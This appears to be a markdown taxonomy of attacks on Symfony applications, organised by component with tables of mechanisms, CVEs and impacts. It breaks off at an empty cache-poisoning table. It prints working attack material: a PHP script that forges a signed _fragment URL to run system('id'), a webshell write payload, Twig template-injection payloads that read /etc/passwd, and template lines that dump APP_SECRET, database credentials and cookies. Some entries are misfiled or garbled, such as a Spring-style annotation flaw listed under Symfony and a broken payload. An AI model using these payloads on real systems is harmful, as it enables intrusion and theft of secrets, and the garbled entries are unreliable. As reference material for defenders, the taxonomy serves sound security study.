# Symfony Framework Vulnerability Mutation/Variation Taxonomy

A comprehensive, generalized taxonomy of attack vectors, vulnerability classes, and exploitation techniques targeting applications built on the Symfony Framework ecosystem (HttpFoundation, HttpKernel, Security, Serializer, Form, Twig, Routing, PropertyAccess, DependencyInjection, Cache).

---

## Classification Structure

This taxonomy organizes the Symfony attack surface along three orthogonal axes:

**Axis 1 — Attack Surface (Structural Target):** The specific Symfony component, mechanism, or architectural layer being targeted. This is the primary organizational axis, defining the 14 top-level categories (§1–§14) of the document. Each category represents a distinct structural aspect of the Symfony ecosystem that can be mutated or abused.

**Axis 2 — Exploitation Mechanism (How the Attack Works):** The cross-cutting technique or principle that enables the attack. Multiple categories may share the same exploitation mechanism. These mechanisms are:

| Mechanism Code | Name | Description |
|---|---|---|
| **M1** | Deserialization / Gadget Chain Abuse | Exploiting PHP `unserialize()` or PHAR metadata to instantiate objects with malicious property values, triggering magic method chains (POP chains) |
| **M2** | Secret Dependency Collapse | Leveraging compromise of `APP_SECRET` to forge HMAC signatures, CSRF tokens, remember-me cookies, and signed URIs across all security subsystems simultaneously |
| **M3** | Parser Differential / Path Normalization Mismatch | Exploiting differences in how firewall regex, router, reverse proxy, and access control evaluate the same URL path |
| **M4** | Template Expression Evaluation | Injecting or manipulating Twig template expressions to achieve code execution, file read, or information disclosure |
| **M5** | Property Binding / Mass Assignment | Exploiting automatic data binding through Serializer, Form, or PropertyAccess to set unintended object properties from user input |
| **M6** | Trust Boundary Confusion | Manipulating proxy headers, request attributes, or session state to exploit implicit trust assumptions in IP resolution, host detection, and authentication |
| **M7** | Configuration Complexity / Insecure Defaults | Leveraging misconfiguration, dangerous defaults, or multi-layer configuration fragility to silently degrade security |
| **M8** | Cache / State Poisoning | Manipulating HTTP cache keys, session data, or compiled container state to serve poisoned content or extract secrets |

**Axis 3 — Impact (What Is Achieved):** The resulting effect of successful exploitation:

| Impact | Symbol |
|---|---|
| Remote Code Execution | **RCE** |
| Information Disclosure / Secret Extraction | **INFO** |
| Authorization Bypass / Privilege Escalation | **AUTHZ** |
| Server-Side Request Forgery | **SSRF** |
| Cross-Site Scripting | **XSS** |
| Cross-Site Request Forgery bypass | **CSRF** |
| Denial of Service | **DoS** |
| Account Takeover / Session Hijacking | **ATO** |
| File System Access | **FS** |

---

## §1. Deserialization & Gadget Chains

Symfony's architecture relies on PHP `serialize()`/`unserialize()` across caching, sessions, and remember-me cookies. The framework ships dozens of classes with exploitable `__destruct()`, `__wakeup()`, and `__toString()` magic methods, creating a persistent and growing gadget chain attack surface cataloged by PHPGGC.

### §1-1. Direct unserialize() Injection

User-controlled data reaches `unserialize()` through Symfony components that historically used native PHP serialization.

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **Remember-me cookie deserialization** | `remember_me` cookie passed user-controlled data directly to `unserialize()`, allowing arbitrary object injection | Symfony 2.7–4.2 with token-based remember-me (CVE-2019-10912) | RCE |
| **Cache adapter deserialization** | `PhpArrayAdapter` and `TagAwareAdapter` deserialized attacker-controlled cache data without type filtering | Symfony 3.x–4.x cache components (CVE-2019-18889) | RCE |
| **Serializer component mass assignment** | `Serializer::deserialize()` with user input to objects set all writable properties without restriction | Symfony 3.x–4.x Serializer | AUTHZ |
| **UriSigner timing attack** | Non-constant-time HMAC comparison in `UriSigner` enabled timing-based forgery of signed URLs | Symfony HttpKernel (CVE-2019-18887) | AUTHZ |
| **WebhookController XSS** | Insufficient output escaping in the WebhookController component allowed cross-site scripting | Symfony 6.x (CVE-2023-46734) | XSS |

### §1-2. PHPGGC Gadget Chains — Symfony-Specific

Pre-built POP (Property-Oriented Programming) chains exploiting Symfony classes. These are usable whenever any `unserialize()` call is reachable with attacker-controlled data, regardless of the injection point.

| Chain ID | Target Classes | Mechanism | Key Condition | Impact |
|----------|---------------|-----------|---------------|--------|
| **Symfony/RCE1** | `TagAwareAdapter` → `ProxyAdapter` | `__destruct()` calls `commit()` which invokes `$this->pool->saveDeferred()` which calls `($this->setInnerItem)()` — an arbitrary callable set to `system` | Cache component in autoload path (Symfony 3.1+) | RCE |
| **Symfony/RCE2** | `Process` | `__destruct()` calls `stop()` which invokes `$this->callback` — an arbitrary callable | Process component in autoload path | RCE |
| **Symfony/RCE3** | Routing + Cache classes | Chain through routing component's compiled URL matcher classes to callable invocation | Routing + Cache components | RCE |
| **Symfony/RCE4** | `TagAwareAdapter` (extended) | Refined RCE1 handling version-specific `$tags` property differences across Symfony 3.4–5.x | Broadest version coverage | RCE |
| **Symfony/FW1** | `Filesystem` classes | File write chain — writes attacker-controlled content to arbitrary paths | Filesystem component | FS, RCE |
| **Symfony/FW2** | Cache adapters + `file_put_contents()` | Cache persistence in `__destruct()` writes attacker content to attacker-controlled path (e.g., webshell) | Symfony 5.2+ cache component | FS, RCE |
| **Symfony/FD1** | `Filesystem` classes | Arbitrary file deletion chain via `__destruct()` cleanup logic | Filesystem component | FS |
| **Monolog/RCE** (common in Symfony) | `BufferHandler` → `StreamHandler` | `__destruct()` flushes buffered log entries; attacker sets log content to PHP code and file path to `.php` in webroot | Monolog (default Symfony logging library) in autoload path | RCE |

**Exploitation detail for RCE1 chain:**

```php
// Entry: TagAwareAdapter.__destruct() -> commit()
// commit() iterates $this->deferred (CacheItem[]) and calls:
//   $this->pool->saveDeferred($item)
// where $this->pool is set to ProxyAdapter

// ProxyAdapter.saveDeferred() calls:
//   ($this->setInnerItem)($item, $innerItem, $this->pool)
// where $this->setInnerItem is set to 'system'

// CacheItem.__toString() returns the key, so:
//   system('id')  // attacker controls the CacheItem key
```

### §1-3. PHAR Deserialization

PHAR archives contain serialized metadata that is automatically deserialized when accessed through `phar://` stream wrapper, converting any file operation primitive into a deserialization attack.

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **File operation trigger** | Any of 30+ filesystem functions (`file_exists`, `is_file`, `getimagesize`, `fopen`, `stat`) on a `phar://` path triggers metadata deserialization | Attacker controls file path argument; `phar://` stream wrapper triggers `unserialize()` on all PHP versions (including 8.x) | RCE |
| **Polyglot PHAR upload** | PHAR file crafted as valid JPEG/PNG to bypass upload filters while retaining PHAR functionality | Image upload + subsequent file operation on uploaded path (e.g., `getimagesize()`) | RCE |
| **Symfony bundle exploitation** | LiipImagineBundle, VichUploaderBundle, and similar bundles call `getimagesize()` on uploaded files — exploitable with PHAR polyglots | Common Symfony image-processing bundles | RCE |

**Why this is structural:** Each new Symfony component potentially introduces new gadget chain endpoints. The composable service architecture with auto-wired constructors and magic method patterns guarantees a large and growing attack surface. File write chains (FW1/FW2) are especially dangerous because they bypass `disable_functions` restrictions that block direct command execution.

---

## §2. APP_SECRET — Single Point of Cryptographic Failure

Symfony uses a single environment variable (`APP_SECRET`) as the HMAC key for all cryptographic operations across the framework. Compromise of this value breaks all security subsystems simultaneously.

### §2-1. APP_SECRET Dependency Surface

| Dependent Operation | Component | Impact of Compromise |
|---------------------|-----------|---------------------|
| **`_fragment` route signing** | `UriSigner` / `FragmentListener` | Forge fragment URLs → arbitrary controller invocation → **RCE** |
| **CSRF token generation** | `CsrfTokenManager` | Forge valid CSRF tokens → bypass CSRF on all forms |
| **Remember-me cookies** | `SignatureRememberMeHandler` | Forge cookies → authenticate as any user → **ATO** |
| **Login link generation** | `LoginLinkHandler` (5.2+) | Forge magic login URLs for any user → **ATO** |
| **Signed URI verification** | `UriSigner` | Forge confirmation/reset/action links |
| **Session metadata** | `NativeSessionStorage` | Session manipulation |
| **Webhook verification** | Various integrations | Forge webhook payloads |

### §2-2. APP_SECRET Leakage Vectors

| Vector | Likelihood | Condition |
|--------|-----------|-----------|
| **Default scaffold value** | High | `ThisTokenIsNotSoSecretChangeIt` left unchanged from `symfony new` |
| **`.env` committed to VCS** | High | `.env` with real secret in Git history (even if `.gitignore`'d later) |
| **Debug profiler exposure** | Medium | `/_profiler/latest?panel=config` accessible in production |
| **Error page in debug mode** | Medium | `APP_DEBUG=1` — stack traces show container parameters |
| **Compiled container file** | Medium | `var/cache/prod/Container*.php` web-accessible via misconfigured server |
| **`.git/` directory exposure** | Medium | `.git/` accessible → `git show HEAD:.env` extracts secret |
| **phpinfo() page** | Low | Environment variables section exposes `APP_SECRET` |
| **Docker/PaaS config exposure** | Low | `docker-compose.yml` or Heroku config leaking secrets |

### §2-3. CSRF Token Forgery with Known Secret

```php
// Symfony CSRF token computation (simplified):
// token = hash('sha256', tokenId . APP_SECRET . sessionId)
// With known APP_SECRET + session ID → forge tokens for any form

$forgedToken = hash('sha256', 'authenticate' . $appSecret . $sessionId);
```

**Security implication:** Session cookie value (session ID) is readable from the browser, and `APP_SECRET` compromise enables pre-computing valid CSRF tokens for any form action — password change, admin operations, account deletion.

---

## §3. FragmentListener — Universal Controller Invocation

The `_fragment` route provides a framework-level endpoint that invokes arbitrary controllers when presented with a valid HMAC signature. It exists to support ESI (Edge Side Includes) and HInclude, but functions as a universal backdoor when `APP_SECRET` is known.

### §3-1. Fragment Route Exploitation

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **Direct RCE via _fragment** | `FragmentListener` parses `_path` query param to extract `_controller` attribute, then invokes it as a PHP callable. HMAC over the full URL is verified using `APP_SECRET` | `_fragment` route enabled (default) + `APP_SECRET` known (CVE-2012-6431/CVE-2012-6432) | RCE |
| **ESI injection escalation** | Stored XSS containing `<esi:include src="/_fragment?...">` triggers server-side fragment fetch through ESI-capable cache (Varnish, Symfony HttpCache) | ESI processing enabled + stored XSS + `APP_SECRET` known | RCE |
| **Profiler-to-fragment chain** | Step 1: `/_profiler/latest?panel=config` extracts `APP_SECRET`. Step 2: Forge `_fragment` URL with extracted secret | Debug profiler accessible in production | RCE |

**Exploitation detail:**

```php
<?php
$secret = 'ThisTokenIsNotSoSecretChangeIt';
$target = 'http://target.com';

// _controller can be any PHP callable: system, exec, file_put_contents
$path = '_controller=system&command=id&return_value=1';
$url = $target . '/_fragment?_path=' . urlencode($path);

// HMAC is computed over the full URL (scheme + host + path + query)
$hash = base64_encode(hash_hmac('sha256', $url, $secret, true));
$exploit = $url . '&_hash=' . urlencode($hash);
// GET $exploit → executes system('id')
```

**Important nuances:**
- HMAC input includes scheme and host → attacker must know internal URL format (http vs https, exact hostname behind proxy)
- `_fragment` processes before the security firewall → no authentication required, only the HMAC
- Subrequest architecture means fragment execution has its own Request context, invisible to application-level logging

### §3-2. Webshell Deployment via Fragment

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **file_put_contents webshell** | `_controller=file_put_contents&0=/var/www/html/public/shell.php&1=<?php system($_GET["c"]); ?>` | Writable web directory, known `APP_SECRET` | RCE |
| **Symfony controller invocation** | `_controller=Symfony\Component\HttpKernel\Controller\ErrorController::preview&code=200` | Guaranteed response output (unlike `system()` which may not return output) | INFO |

---

## §4. Twig Template Injection (SSTI)

Symfony uses Twig as its default template engine. The Twig sandbox is opt-in (off by default) and has been bypassed repeatedly. Template injection occurs through both template name manipulation and template content injection.

### §4-1. Template Name Injection

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **User-controlled template name** | Template name passed to `Environment::render()` from user input allows code injection via specially crafted template names | Application passes unsanitized input as template name (CVE-2024-51996) | RCE |
| **Path traversal via source()/include()** | `source()` and `include()` Twig functions with user-controlled template names enable arbitrary file read: `{{ source('/etc/passwd') }}` | User input reaches template name argument (CVE-2022-39261) | FS |

### §4-2. Template Content Injection (SSTI)

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **Twig 1.x `_self.env` chain** | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` — registers arbitrary callable as filter callback, then triggers it | Twig 1.x; user input rendered in template | RCE |
| **Twig 2.x/3.x callable filter abuse** | `{{"id"|map("system")}}`, `{{"id"|filter("system")}}`, `{[0,"id"]|reduce("system")}` — Twig filter functions accept PHP callables | Sandbox disabled (default); user input in template | RCE |
| **`app` variable information disclosure** | `{{app.request.server.all|join("\n")}}` — the `app` global variable exposes the full `Request` object, environment, debug status, session, and user | Symfony-Twig integration; any SSTI | INFO |

### §4-3. Sandbox Bypass Techniques

Twig's sandbox, when enabled, uses an allowlist model for methods, properties, and functions. This model has been repeatedly bypassed.

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **`sort` filter callable bypass** | `sort` filter allowed arbitrary function calls as the comparison callback, escaping the sandbox | Twig 2.x–3.x sandbox (CVE-2020-15098) | RCE |
| **Callable pattern escape** | Certain callable patterns (e.g., array callables, Closure bindings) were not recognized by the sandbox inspector | Twig 3.x sandbox (CVE-2022-23614, CVSS 9.8) | RCE |
| **Object method chain traversal** | Sandbox checks direct method calls but not the transitive call chain — `allowedObject.getService().dangerousMethod()` passes if `getService()` is allowed | Sandbox with broad method allowlist | RCE |
| **`__toString()` implicit invocation** | Twig's output mechanism calls `__toString()` implicitly; the sandbox does not intercept this, allowing `__toString()` to call restricted methods internally | Object with dangerous `__toString()` on allowlist | RCE |

### §4-4. Auto-Escaping Limitations

Twig auto-escapes using `htmlspecialchars()` by default — secure for HTML body context but insufficient in other contexts.

| Context | Vulnerability | Secure Pattern |
|---------|--------------|----------------|
| **JavaScript** | `var x = '{{ user.name }}';` — single quotes and JS control chars are NOT HTML entities | `var x = {{ user.name\|json_encode }};` or `{{ user.name\|e('js') }}` |
| **CSS** | `body { background: url({{ input }}); }` — HTML escaping is irrelevant in CSS context | `{{ input\|e('css') }}` |
| **URL/href** | `<a href="{{ url }}">` — `javascript:alert(1)` passes through `htmlspecialchars()` unchanged | Validate scheme is `https://` + `{{ url\|e('url') }}` |
| **`\|raw` filter** | `{{ user_input\|raw }}` disables ALL escaping — direct XSS | Never use `\|raw` on user-controlled data |

### §4-5. AppVariable Information Exposure

The `app` global variable (`Symfony\Bridge\Twig\AppVariable`) is available in every template and exposes:

```twig
{{ app.debug }}                              {# true/false — tells attacker if debug mode is on #}
{{ app.environment }}                        {# 'dev' or 'prod' #}
{{ app.request.server.get('DATABASE_URL') }} {# database credentials #}
{{ app.request.server.get('APP_SECRET') }}   {# THE secret key #}
{{ app.request.cookies.all|join }}           {# all cookies #}
{{ app.user.password }}                       {# password hash (if User entity exposes it) #}
{{ app.token }}                               {# security token object #}
```

---

## §5. HttpFoundation — Request Trust Architecture

Symfony's `Request` object centralizes all HTTP request parsing and proxy trust decisions. Misconfiguration of trusted proxies cascades through every IP-dependent security mechanism.

### §5-1. Trusted Proxy Misconfiguration Cascade

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **Wildcard proxy trust** | `Request::setTrustedProxies(['0.0.0.0/0'], ...)` or `TRUSTED_PROXIES=REMOTE_ADDR` — any client spoofs IP via `X-Forwarded-For` | Cloud environments with dynamic proxy IPs often recommended to use `REMOTE_ADDR` | AUTHZ |
| **Missing proxy configuration** | `getClientIp()` returns proxy IP instead of real client IP when no trusted proxies configured behind reverse proxy | Application behind LB/proxy without `TRUSTED_PROXIES` | AUTHZ |
| **X-Forwarded-Host injection** | Trusting `HEADER_X_FORWARDED_HOST` allows host header injection → cache poisoning, password reset link manipulation | `X-Forwarded-Host` trusted in proxy config | ATO, INFO |
| **IPv6-mapped IPv4 bypass** | `IpUtils::checkIp()` failed to normalize `::ffff:127.0.0.1` against IPv4 whitelist entries | Specific IPv6/IPv4 mapping edge cases (CVE-2024-24569) | AUTHZ |

**Cascade effect:** Once `getClientIp()` returns a spoofed IP, ALL downstream consumers are simultaneously compromised:
- Rate limiting (`Symfony\Component\RateLimiter`)
- Login throttling (`LoginThrottlingListener`)
- IP-based access control voters
- Audit logging
- Geo-based features

### §5-2. ParameterBag Type Coercion

PHP's loose typing propagated through the framework's request parameter API.

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **`get()` returns `mixed`** | `$request->query->get('id')` returns raw user input with no type guarantee — `"abc" == 0` is true in PHP < 8.0 | Loose comparison on ParameterBag values | AUTHZ |
| **`getInt()` silent truncation** | `(int) "123abc"` returns `123` — no validation, no error, no warning | `getInt()` used on unvalidated input | AUTHZ |
| **`InputBag` vs `ParameterBag` confusion** | `$request->query` and `$request->request` use `InputBag` (stricter), but `$request->attributes` uses plain `ParameterBag` — identical API hides trust boundary | Mixing `attributes` (framework-internal) with `query`/`request` (user-controlled) | AUTHZ |
| **`$request->attributes` trust violation** | Attributes bag holds both router-injected parameters (trusted) and custom data — same `->get()` API conflates trust levels | Code treating `attributes` values as user-controlled or vice versa | AUTHZ |

### §5-3. Request Header Manipulation

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **X-Original-URL / X-Rewrite-URL override** | Header injection overrode the request path, bypassing access controls entirely | Symfony 2.7–4.1 (CVE-2018-14773) | AUTHZ |
| **Accept-Language DoS** | Crafted `Accept-Language` headers caused excessive processing | Symfony 2.x–4.x (CVE-2018-11386) | DoS |
| **HTTP method override** | `_method` POST parameter or `X-HTTP-Method-Override` header changes request method — firewall checks original method but router uses overridden | Method override enabled (default in Symfony) | AUTHZ |

### §5-4. Session Configuration Insecure Defaults

| Setting | Default | Secure Value | Risk |
|---------|---------|-------------|------|
| `cookie_secure` | `''` (empty/off) in standalone HttpFoundation | `true` | Session cookies transmitted over plain HTTP |
| `use_strict_mode` | PHP default `0` (off) | `true` | Session fixation — attacker-set session IDs accepted |
| `cookie_httponly` | `true` | `true` | (Secure default) |
| `cookie_samesite` | `lax` (since Symfony 5.3) | `lax` or `strict` | (Secure default) |

**Framework divergence:** The full FrameworkBundle sets `cookie_secure: auto`, but standalone HttpFoundation users (including Laravel, which uses Symfony HttpFoundation) get no such protection with zero warning.

---

## §6. Security Component — Authentication & Authorization Architecture

The Security component's layered architecture of firewalls, voters, authenticators, and token handlers creates a large attack surface amplified by configuration complexity.

### §6-1. Firewall Ordering as Silent Security Bypass

Firewalls are processed top-to-bottom in YAML key order. First match wins.

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **`security: false` overmatch** | `dev` firewall with `security: false` and overly broad pattern disables ALL security (auth, authz, CSRF, session) for matching paths | `dev` firewall pattern too broad or profiler enabled in production | AUTHZ |
| **YAML ordering dependency** | If `main` (`^/`) appears before `api` (`^/api`), the API firewall never activates — `^/` matches first | Incorrect YAML key ordering in `security.yaml` | AUTHZ |
| **Path normalization gap** | URL-encoded characters, double slashes, trailing dots cause requests to miss intended firewall pattern | Regex-based pattern matching against raw request path | AUTHZ |
| **Cross-firewall CSRF fixation** | Requests routed to different firewall contexts allowed CSRF token fixation across boundaries | Firewall boundary crossing (CVE-2022-24895) | CSRF |

### §6-2. AccessDecisionManager — Insecure Default Strategy

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **Affirmative strategy (default)** | A single voter returning `ACCESS_GRANTED` immediately overrides ALL `ACCESS_DENIED` votes | Default `strategy: affirmative` — any single permissive voter wins | AUTHZ |
| **Abstention confusion** | If attribute string is misspelled (e.g., `IS_AUTHENTICATED` vs `IS_AUTHENTICATED_FULLY`), all voters abstain; if `allowIfAllAbstainDecisions=true`, access is silently granted | Typo in security attribute + permissive abstain config | AUTHZ |
| **Custom voter override** | A custom voter that accidentally returns `ACCESS_GRANTED` for an edge case overrides all framework security voters | Any custom voter with incomplete logic | AUTHZ |

**Configuration fix:**
```yaml
security:
    access_decision_manager:
        strategy: unanimous   # ALL voters must agree (or abstain)
```

### §6-3. Authentication Bypass Patterns

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **Session fixation on auth** | Session ID not regenerated after authentication — attacker pre-sets session ID before victim authenticates | Multiple CVEs: CVE-2022-24894, CVE-2022-24895, CVE-2018-11385 | ATO |
| **Remember-me token fixation** | Sessions not properly invalidated in certain user provider configurations with remember-me | CVE-2023-46733 | ATO |
| **Cookie-based session auth bypass** | Improper token validation in cookie-based session authentication | CVE-2021-41268 | ATO |
| **Invalid method override** | Reject invalid HTTP method override bypassed security firewalls matching on HTTP method | CVE-2019-10913 | AUTHZ |
| **Generic type annotation detection flaw** | Method-level `@PreAuthorize`/`@Secured` annotations on generic superclass/interface methods not properly detected on implementations | Similar to Spring's CVE-2025-41248 pattern in voter-based method security | AUTHZ |

### §6-4. Remember-Me Token Security

```php
// SignatureRememberMeHandler computes:
// hmac('sha256', className . userIdentifier . expiry . passwordHash, APP_SECRET)
// Cookie value: base64(class : username : expiry : hmacSignature)
```

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **Cookie forgery with known secret** | With `APP_SECRET` known, attacker forges remember-me cookies for any user (also needs password hash for signature-based handler) | `APP_SECRET` leaked | ATO |
| **Cookie information disclosure** | Cookie is HMAC-signed but NOT encrypted — user identifier and expiration visible in base64 | Default remember-me configuration | INFO |
| **Class name switching** | Changing the user class FQCN in the cookie to switch between user providers (e.g., `AdminUser` vs `User`) | Multiple user providers with overlapping usernames | AUTHZ |
| **No secret rotation mechanism** | Changing `APP_SECRET` instantly invalidates ALL remember-me cookies, CSRF tokens, and signed URLs simultaneously with no migration path | Secret compromise requiring rotation | DoS |

### §6-5. Role Hierarchy Complexity

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **Unintended transitive inheritance** | `ROLE_EDITOR → ROLE_MOD → ROLE_USER`, then adding `ROLE_MOD → ROLE_EDITOR` creates cycle handled silently but indicates broken configuration | Complex role hierarchies without validation | AUTHZ |
| **Configuration typo dead branches** | `ROLE_ADIMN` instead of `ROLE_ADMIN` creates a dead branch with no warning — no runtime validation of role name consistency | Typo in `security.yaml` role hierarchy | AUTHZ |

---

## §7. Serializer Component — Mass Assignment via Deserialization

The Serializer component maps JSON/XML/YAML input to PHP objects. Its default settings create a mass assignment surface equivalent to Spring's `@ModelAttribute`.

### §7-1. ObjectNormalizer Mass Assignment

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **Default `ALLOW_EXTRA_ATTRIBUTES=true`** | Extra JSON fields that don't map to properties are silently dropped; matching properties are always set with no access control | Default Serializer configuration (any version) | AUTHZ |
| **PropertyAccess-based binding** | `ObjectNormalizer` uses `PropertyAccessor` which follows setters, public properties, `__set()` magic methods, and adder/remover patterns | ObjectNormalizer (default normalizer) | AUTHZ |
| **PropertyNormalizer reflection bypass** | `PropertyNormalizer` uses PHP reflection to access properties directly — even `private $role` with no setter is writable | PropertyNormalizer configured as normalizer | AUTHZ |
| **Nested object graph traversal** | PropertyAccess follows dot-notation paths (`address.city.name`) enabling deep object modification | Complex entity relationships without groups | AUTHZ |

**Vulnerable pattern (extremely common in Symfony API projects):**

```php
// VULNERABLE — all public setters called with attacker-controlled data
#[Route('/api/user', methods: ['PUT'])]
public function update(Request $request, SerializerInterface $serializer): JsonResponse
{
    $user = $serializer->deserialize(
        $request->getContent(), User::class, 'json'
    );
    // Attacker JSON: {"name":"hacker","role":"ROLE_ADMIN","emailVerified":true}
    $em->merge($user);
    $em->flush();
}

// SECURE — DTO with groups and explicit mapping
$dto = $serializer->deserialize(
    $request->getContent(), UserUpdateDto::class, 'json',
    ['groups' => ['user:write'], AbstractNormalizer::ALLOW_EXTRA_ATTRIBUTES => false]
);
```

### §7-2. Polymorphic Type Discrimination

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **Client-controlled type instantiation** | `#[DiscriminatorMap(typeProperty: 'type', mapping: [...])]` — the `type` field in JSON determines which PHP class is instantiated | Discriminator mapping on deserialization target | AUTHZ |
| **Dangerous constructor/destructor side effects** | Mapped classes may have destructors that modify global state, send emails, or delete files — attacker controls which class lifecycle runs | Type mapping includes classes with magic method side effects | RCE |
| **Doctrine discriminator confusion** | Developers familiar with Doctrine's `@DiscriminatorMap` (operates on trusted DB data) may assume Serializer provides equivalent safety — it operates on untrusted external input | Mixed Doctrine/Serializer usage patterns | AUTHZ |

---

## §8. Form Component — CSRF & Data Binding

### §8-1. CSRF Protection Multi-Layer Fragility

CSRF protection in Symfony depends on correct configuration across multiple independent layers that can silently degrade.

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **CSRF only on compound root forms** | Protection is added only when `!$view->parent && $options['compound']` — simple forms, child forms, and manual `$request->getContent()` processing have zero CSRF protection | Endpoints processing data outside Form component | CSRF |
| **Token ID collision** | `csrf_token_id` defaults to form type name — multiple forms using same type class have interchangeable CSRF tokens | Multiple forms with same base FormType | CSRF |
| **Developer CSRF disable pattern** | Session rotation between form render and submit causes "Invalid CSRF token" error — developers respond by disabling CSRF globally: `csrf_protection: false` | Session lifecycle mismatch + developer frustration | CSRF |
| **API endpoint gap** | Session-authenticated SPA backends using cookies need CSRF protection but bypass the Form component entirely | JSON APIs with session-based auth | CSRF |
| **CSRF token seeded from session** | CSRF tokens are derived from session ID — any session fixation automatically yields valid CSRF tokens | Session fixation vulnerability | CSRF |

### §8-2. Form Data Binding via PropertyAccess

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **Deep PropertyPath traversal** | Form types with `'mapped' => true` (default) and deep `PropertyPath` expressions traverse into nested objects, expanding the writable surface | Complex object graphs in form data classes | AUTHZ |
| **Magic method invocation** | `PropertyAccessor::setValue()` calls `__set()` as fallback — objects with side-effect-producing `__set()` are vulnerable | Entity with `__set()` handling sensitive operations | AUTHZ |

**Note:** The Form component is structurally more secure than the Serializer because each field must be explicitly added with `$builder->add()` — a natural whitelist. The risk increases with deep property paths and nested form types.

---

## §9. Routing — Parameter Injection & Path Matching

### §9-1. Route Parameter Overly Permissive Defaults

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **Default `[^/]+` regex** | Without explicit `requirements`, `{id}` matches `../../etc`, `1 OR 1=1`, `<script>alert(1)</script>`, or any non-slash string | No `requirements` constraint on route parameter | XSS, AUTHZ |
| **URL-decoded payload injection** | Route matching occurs on URL-decoded path — `%2e%2e` decoded to `..` before regex matching | Path traversal payloads in route parameters | FS |
| **`_format` parameter injection** | Special `_format` parameter controls response Content-Type — attacker requests `.html` format → `Content-Type: text/html` enables XSS in API responses | `_format` exposed without restrictions | XSS |
| **PHP silent type casting** | `#[Route('/user/{id}')] public function show(int $id)` — PHP casts `"abc"` to `0` silently, not a rejection | PHP type coercion on controller arguments | AUTHZ |

### §9-2. Path Normalization Mismatch (Security vs Router)

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **Trailing slash mismatch** | `access_control: ^/admin` does not match `/admin/` — router redirects to canonical URL but access control check already passed | Strict regex in access control, lenient router | AUTHZ |
| **Case sensitivity gap** | `^/admin` does not match `/Admin` — case-insensitive web servers route both to same controller | Case-insensitive deployment environment | AUTHZ |
| **Double URL decoding** | UrlMatcher calls `rawurldecode()` — if web server already decoded, double decoding transforms `%252e%252e` into `..` | Multi-layer URL decoding chain | FS, AUTHZ |
| **Access control evaluated independently** | `access_control` entries use regex against raw request path, evaluated independently from route matching — a route can match a request that access control regex does not | Mismatch between route patterns and access control regex | AUTHZ |

### §9-3. Controller Argument Auto-Resolution

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **EntityValueResolver IDOR** | Doctrine's `EntityValueResolver` auto-fetches entities from route parameters — `#[Route('/user/{user}')] public function show(User $user)` fetches ANY user by ID without authorization check | DoctrineBundle with EntityValueResolver enabled | AUTHZ |
| **Resolver priority shadowing** | Route parameters (priority 1) shadow session values (priority 3) — if both match a controller argument name, the URL segment wins | Route parameter name matching session attribute name | AUTHZ |
| **MapRequestPayload mass assignment** | `#[MapRequestPayload] UserDTO $dto` automatically populates DTO from request body — if DTO has `role` property, attacker can set it | Symfony 6.3+ request payload mapping | AUTHZ |

---

## §10. Debug / Profiler Exposure

### §10-1. Profiler Information Disclosure

| Endpoint | Data Exposed | Impact |
|----------|-------------|--------|
| `/_profiler/latest?panel=config` | `APP_SECRET`, environment, PHP version, all container parameters | INFO → RCE (via §3) |
| `/_profiler/<token>?panel=db` | Full database queries with bound parameter values | INFO |
| `/_profiler/<token>?panel=security` | Authentication state, user object, voter decisions | INFO |
| `/_profiler/<token>?panel=request` | Full request/response headers, cookies, session data | INFO |
| `/_profiler/<token>?panel=mailer` | Sent emails with content (password resets, verification links) | ATO |
| `/_profiler/<token>?panel=exception` | Stack traces with source code context, file paths | INFO |
| `/_profiler/search?limit=100` | Enumerable profiler tokens for all recent requests | INFO |
| `/_wdt/<token>` | Web Debug Toolbar data in JSON format | INFO |

### §10-2. Debug Mode Exploitation Chain

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **`.env` chain confusion** | Load order is `.env` → `.env.local` → `.env.$APP_ENV` → `.env.$APP_ENV.local` — misunderstanding leaves `APP_DEBUG=1` | Complex environment configuration | INFO |
| **Error page full disclosure** | `APP_DEBUG=1` renders complete request parameters, server variables, loaded configuration, stack traces with source, and ALL environment variables on any error | Debug mode active in production | INFO |
| **Console command exposure** | `bin/console` web-accessible from misconfigured document roots — `debug:router`, `debug:container`, `secrets:list` dump entire application architecture | Webroot misconfigured to include project root | INFO |

### §10-3. Compiled Container as Exfiltration Target

`var/cache/prod/Container*.php` contains: all service definitions, constructor arguments, database credentials, API keys, full routing table, and resolved `APP_SECRET`. Any file-read primitive (SSTI §4, path traversal §9, LFI) makes this the single most valuable exfiltration target in a Symfony application.

---

## §11. HTTP Cache Poisoning

### §11-1. Cache Key Manipulation

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
